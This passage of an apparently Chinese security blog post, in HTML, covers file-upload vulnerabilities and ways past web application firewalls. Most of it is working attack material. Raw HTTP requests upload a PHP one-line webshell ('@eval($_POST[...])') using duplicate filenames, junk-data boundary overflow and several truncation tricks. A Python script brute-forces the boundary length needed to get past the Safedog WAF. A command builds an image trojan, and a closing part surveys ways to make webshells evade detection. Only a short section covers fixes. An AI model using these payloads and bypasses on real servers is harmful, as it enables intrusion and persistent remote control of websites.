class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;hack&#x27;</span>]); ?&gt;</span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------<span class="title class_">WebKitFormBoundarymeEzpUTMsmOfjwAA</span>--</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-4-2-filename重复"><a href="#5-4-2-filename重复" class="headerlink" title="5.4.2 filename重复"></a>5.4.2 filename重复</h3><p>最终上传成功的文件名是shell.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-5-数据溢出"><a href="#5-5-数据溢出" class="headerlink" title="5.5 数据溢出"></a>5.5 数据溢出</h2><h3 id="5-5-1-name与filename之间插入垃圾数据"><a href="#5-5-1-name与filename之间插入垃圾数据" class="headerlink" title="5.5.1 name与filename之间插入垃圾数据"></a>5.5.1 name与filename之间插入垃圾数据</h3><p>name与filename之间插入大量垃圾数据。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /<span class="title class_">Pass</span>-<span class="number">02</span>/index.<span class="property">php</span> <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: hackrock.<span class="property">com</span>:<span class="number">813</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=----<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Connection</span>: close</span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; fbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf; </span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf--</span><br></pre></td></tr></table></figure>
+
+<p>注：需在大量垃圾数据后加“;”</p>
+<h3 id="5-5-2-boundary字符串中加入垃圾数据"><a href="#5-5-2-boundary字符串中加入垃圾数据" class="headerlink" title="5.5.2 boundary字符串中加入垃圾数据"></a>5.5.2 boundary字符串中加入垃圾数据</h3><p>boundray字符串的值可以为任何数据（有一定的长度限制），当长度达到WAF无法处理时，而Web<a target="_blank" rel="noopener" href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065">服务器</a>又能够处理，那么就可以绕过WAF上传文件。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /<span class="title class_">Pass</span>-<span class="number">01</span>/index.<span class="property">php</span> <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: hackrock.<span class="property">com</span>:<span class="number">813</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=----<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span><br><span class="line"><span class="title class_">Connection</span>: close</span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>;filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9--</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-5-3-boundray末尾插入垃圾数据"><a href="#5-5-3-boundray末尾插入垃圾数据" class="headerlink" title="5.5.3 boundray末尾插入垃圾数据"></a>5.5.3 boundray末尾插入垃圾数据</h3><p>刚才讲到过<code>boundary</code>末尾可以插入任何数据，那么就可以在<code>boundary</code>字符串末尾加入大量垃圾数据。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /<span class="title class_">Pass</span>-<span class="number">01</span>/index.<span class="property">php</span> <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: hackrock.<span class="property">com</span>:<span class="number">813</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=----<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf,bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span><br><span class="line"><span class="title class_">Connection</span>: close</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">592</span></span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf--</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-5-4-multipart-form-data与boundary之间插入垃圾数据"><a href="#5-5-4-multipart-form-data与boundary之间插入垃圾数据" class="headerlink" title="5.5.4 multipart&#x2F;form-data与boundary之间插入垃圾数据"></a>5.5.4 multipart&#x2F;form-data与boundary之间插入垃圾数据</h3><p>刚才讲到过<code>multipart/form-data</code>与<code>boundary</code>之间可以插入任何数据，那么就可以在<code>multipart/form-data</code>与<code>boundary</code>之间加入大量垃圾数据。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /<span class="title class_">Pass</span>-<span class="number">01</span>/index.<span class="property">php</span> <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: hackrock.<span class="property">com</span>:<span class="number">813</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9 boundary=----<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Connection</span>: close</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">319</span></span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br><span class="line"></span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------<span class="title class_">WebKitFormBoundaryzEHC1GyG8</span>wYOH1rf--</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-6-数据截断"><a href="#5-6-数据截断" class="headerlink" title="5.6 数据截断"></a>5.6 数据截断</h2><h3 id="5-6-1-回车换行截断"><a href="#5-6-1-回车换行截断" class="headerlink" title="5.6.1 回车换行截断"></a>5.6.1 回车换行截断</h3><p>POST请求体是可以换行的，但是中间不得有空行。若WAF匹配文件名到换行截止，则可以绕过。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: <span class="keyword">for</span></span><br><span class="line">m-data; name=<span class="string">&quot;upload_</span></span><br><span class="line"><span class="string">file&quot;</span>; fi</span><br><span class="line">le</span><br><span class="line">name=<span class="string">&quot;sh</span></span><br><span class="line"><span class="string">ell.p</span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string">p&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-6-2-分号截断"><a href="#5-6-2-分号截断" class="headerlink" title="5.6.2 分号截断"></a>5.6.2 分号截断</h3><p>若WAF匹配文件名到分号截止，则可以绕过。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg;.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-6-3-引号截断"><a href="#5-6-3-引号截断" class="headerlink" title="5.6.3 引号截断"></a>5.6.3 引号截断</h3><p>php&lt;5.3 单双引号截断特性。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&#x27;.php&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span>.<span class="property">php</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-6-4-00截断"><a href="#5-6-4-00截断" class="headerlink" title="5.6.4 00截断"></a>5.6.4 00截断</h3><p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，所以当url中出现%00时就会认为读取已结束。这里使用<code>[0x00]</code>代替16进制的00字符</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php[0x00].jpg&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-7-安全狗绕过"><a href="#5-7-安全狗绕过" class="headerlink" title="5.7 安全狗绕过"></a>5.7 安全狗绕过</h2><p>WAF：网站安全狗（Apache版）v4.0.3025</p>
+<p>干货 | 最全的文件上传漏洞之WAF拦截绕过总结：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1944142">https://cloud.tencent.com/developer/article/1944142</a></p>
+<h3 id="5-7-1-编写脚本利用数据溢出绕过"><a href="#5-7-1-编写脚本利用数据溢出绕过" class="headerlink" title="5.7.1 编写脚本利用数据溢出绕过"></a>5.7.1 编写脚本利用数据溢出绕过</h3><p>在boundary字符串后加入大量垃圾数据。使用python2.7编写。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># _*_  coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://hackrock.com:813/Pass-01/index.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_str</span>(<span class="params">randomlength=<span class="number">16</span></span>):</span><br><span class="line">    random_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    base_str = <span class="string">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line">    length = <span class="built_in">len</span>(base_str) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(randomlength):</span><br><span class="line">        random_str += base_str[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">    <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">8000</span>,<span class="number">50</span>):</span><br><span class="line">    stri = generate_random_str(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Host&quot;</span>:<span class="string">&quot;hackrock.com:813&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://hackrock.com:813/Pass-01/index.php&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;multipart/form-data; boundary=----&quot;</span> + stri</span><br><span class="line">        &#125;</span><br><span class="line">        payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            ------&quot;&quot;&quot;</span> + stri +<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span></span><br><span class="line"><span class="string">            Content-Type: image/png</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;?php @eval($_POST[&#x27;hack&#x27;]); ?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            ------&quot;&quot;&quot;</span> + stri + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            上传</span></span><br><span class="line"><span class="string">            ------&quot;&quot;&quot;</span> + stri + <span class="string">&quot;&quot;&quot;--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        response=requests.post(url=url,headers=headers,data=payload,timeout=<span class="number">0.5</span>)</span><br><span class="line">        result = response.content</span><br><span class="line">        <span class="built_in">print</span> result</span><br><span class="line">        <span class="built_in">print</span> stri</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="comment">#print payload</span></span><br><span class="line">        <span class="comment">#print headers</span></span><br><span class="line">        <span class="keyword">if</span> result.count(<span class="string">&#x27;上传&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Length is : %s &quot;</span> % <span class="built_in">str</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;.&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>测试长度为3710个字符。</p>
+<p>将构造好的数据包放进Burp尝试发送。</p>
+<h3 id="5-7-2-利用00截断绕过"><a href="#5-7-2-利用00截断绕过" class="headerlink" title="5.7.2 利用00截断绕过"></a>5.7.2 利用00截断绕过</h3><p>上传文件，使用Burp抓包，将filename的值改为：<code>shell.php;.jpg</code>。</p>
+<p>然后打开hex,（分号的16进制为0x3b）修改16进制内容，把3b改成00。</p>
+<p>发送数据，成功绕过。</p>
+<h1 id="6-安全修复"><a href="#6-安全修复" class="headerlink" title="6 安全修复"></a>6 安全修复</h1><p>后端验证：针对后端验证的可以采用通过服务器进行验证。</p>
+<p>后缀检测：利用黑白名单进行过滤，当然最好是使用白名单，黑名单有时候总归会存在一些未想到的后缀，而白名单就相对简单一点，只需要想放通哪些后缀即可，而且防范更好一些。</p>
+<p>上传目录：对上传文件到的目录可以设置一个不可执行的权限。</p>
+<p>文件名：针对文件名可以自定义一些随机数以及一些其他的内容进行二次修改，从而改变文件的名称。</p>
+<p>内容检测：可以使用文件头，完整性检测，最好能够对内容的数据进行判断是否存在一些webxshll类似的代码，若出现这类代码，直接删除。</p>
+<h1 id="7-图片马制作方法"><a href="#7-图片马制作方法" class="headerlink" title="7 图片马制作方法"></a>7 图片马制作方法</h1><p><strong>方法一：</strong>CMD方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b test.png+1.php muma.png</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法二：</strong>直接使用工具增加备注写入一句话木马。</p>
+<blockquote>
+<p>edjpgcom.exe</p>
+</blockquote>
+<h1 id="8-Webshell免杀"><a href="#8-Webshell免杀" class="headerlink" title="8 Webshell免杀"></a>8 Webshell免杀</h1><p>webshell通常可分为一句话木马，小马，大马，内存马。</p>
+<ol>
+<li><p>一句话木马是最简单也是最常见的webshell形式，这种木马体积小，隐蔽较强，免杀相对容易；</p>
+</li>
+<li><p>小马是功能较为简单的Webshell，但比一句话木马稍复杂，可能会包含一个简单的文件管理界面或命令执行功能；</p>
+</li>
+<li><p>大马是功能全面的webshell，通常带有图形用户界面，提供文件管理、数据库操作、命令执行等多种功能，比如常用的蚁剑，冰蝎，哥斯拉等，大马由于功能复杂，在做免杀时一般需要将大马伪装成合法管理工具，分解成多个独立模块，分别加载，降低单点检测风险；</p>
+</li>
+<li><p>内存马是一种驻留在内存中的恶意代码，通常通过修改服务器进程的内存空间来执行，极难被发现和删除。与一般的webshell木马不同，内存马免杀一般需要采用内存隐藏，动态注入等方式，尽可能的隐藏恶意代码在内存中的存在，降低被持久发现的风险。</p>
+</li>
+</ol>
